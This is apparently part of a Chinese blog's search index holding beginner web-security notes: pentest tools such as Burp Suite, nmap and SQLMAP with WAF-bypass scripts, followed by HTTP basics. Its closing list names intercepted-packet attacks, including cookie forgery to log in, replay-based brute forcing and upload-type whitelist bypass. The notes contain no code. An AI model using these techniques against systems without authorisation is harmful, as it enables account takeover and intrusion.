<p>爬行小工具还有：burp suit/….<br>网段端口扫描工具：nmap（windows版应该是Znmap）<br>子域名查询：一般网页就有（搜索子域名查询）<br>SQL盲注等注入：SQLMAP（带有过狗过防火墙的脚本，贼强）<br>有关数据包的（HTTP协议包）：直接burp suit工具<br>软件抓包：Wireshark工具</p>
<hr>
<p>Netsparker：方法一样，Start New Scan ，输入URL，自动扫描漏洞。</p>
<p><img src="http://i.imgur.com/kBnx6so.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP协议]]></title>
      <url>/2017/04/08/HTTP%E5%8D%8F%E8%AE%AE/</url>
      <content type="html"><![CDATA[<p>HTTP协议（超文本传输协议）：<br>  URL：网页地址。例：<a href="http://www.xxx.com/abc/bcd.html" target="_blank" rel="external">http://www.xxx.com/abc/bcd.html</a><br>                     <a href="http://www.xxx.com/index.asp" target="_blank" rel="external">http://www.xxx.com/index.asp</a><br>             <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a><br>                     等都是URL。</p>
<hr>
<p>HTTP遵循：请求（request）、相应（respsonse）  两部分</p>
<p>http请求（request）：<br><a id="more"></a><br><img src="http://i.imgur.com/fwyTIyA.png" alt=""></p>
<p>当发送请求包，自然也有响应包：<br>http响应：</p>
<p><img src="http://i.imgur.com/KjlS1jY.png" alt=""></p>
<hr>
<p>HTTP请求方式：Get、Post、Put、Delete、trace、等<br>常见如下：<br>Get：用于短内容和不用保密的信息<br>Post：用于传输长内容或需保密的信息。</p>
<p>危险请求方式：<br>PUT：危险请求方式，用于请求服务器把请求的实体储存在请求资源下。如果资源存在，则替换服务器的原先数据。（用抓包工具利用）<br>Delete：请求方式可改成删除指定资源<br>Trace：允许客户端了解数据链另一端的接受情况，并利用这些数据信息去做相关测试。<br>….</p>
<p>响应行重要状态码：200：请求成功，正常执行<br>                302：网页发生跳转  （URL重定向）<br>                401：未授权<br>                403：服务器拒绝服务。<br>                404：请求资源不存在<br>                500：服务器内部错误。</p>
<hr>
<p>http与https区别：https单纯的比http更安全而已。安全基础是SSL。<br>即：http+SSL == https</p>
<p>Http端口：80<br>https端口：443</p>
<hr>
<p>截取http协议包工具：burpsuit/Fiddler/</p>
<p>利用截取的协议包，可进行任意的更改操作。从而达到相关测试的目的。<br>例如：1．修改/伪造的Cookies值  从而达到登陆的目的<br>      2．无限重放协议包，从而达到自动化暴力破解登陆账号的目的<br>      3．修改请求的上传文件类型。从而绕过本地/远程白名单限制。<br>      4．查看上传地址，从而获取上次文件的URL位置<br>      5．简单获取服务器信息</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
